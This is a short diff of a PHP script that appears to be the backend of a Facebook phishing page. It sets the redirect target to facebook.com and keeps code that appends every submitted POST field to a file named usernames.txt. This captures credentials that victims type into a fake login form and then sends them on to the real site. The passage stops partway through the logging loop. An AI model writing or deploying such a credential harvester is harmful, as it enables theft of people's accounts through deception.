@@ -1,5 +1,6 @@
 _<?php
-header ('Location:-The site you are using- ');
+$url = 'http://www.facebook.com';
+header( "Location: $url" );
 $handle = fopen('usernames.txt', 'a');
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
